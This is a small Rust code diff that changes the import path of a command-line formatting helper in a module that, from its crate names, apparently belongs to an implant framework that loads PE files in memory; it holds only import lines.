@@ -1,7 +1,7 @@
 #![allow(unused_assignments)]
 use crate::{check_request, Module, Result, TaskResult};
 use async_trait::async_trait;
-use malefic_helper::common::format_cmdline;
+use malefic_helper::common::utils::format_cmdline;
 use malefic_helper::to_error;
 use malefic_helper::win::kit::pe::inlinepe::inline_pe;
 use malefic_proto::proto::implantpb::spite::Body;
